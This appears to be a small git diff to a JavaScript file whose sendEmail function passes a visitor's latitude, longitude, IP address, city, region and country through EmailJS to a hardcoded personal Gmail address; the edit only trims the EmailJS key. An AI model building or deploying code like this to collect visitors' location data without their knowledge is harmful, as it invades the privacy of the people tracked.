@@ -95,7 +95,7 @@ function displayLocation(lat, lon) {
 
 // Function to send email using EmailJS
 function sendEmail(lat, lon, ipAddress, city, region, country) {
-    emailjs.init('3PyPbjChXwDJ4z-1U..');
+    emailjs.init('3PyPbjChXwDJ4z-1U');
 
     const templateParams = {
         to_email: 'abdullah22developer@gmail.com', 
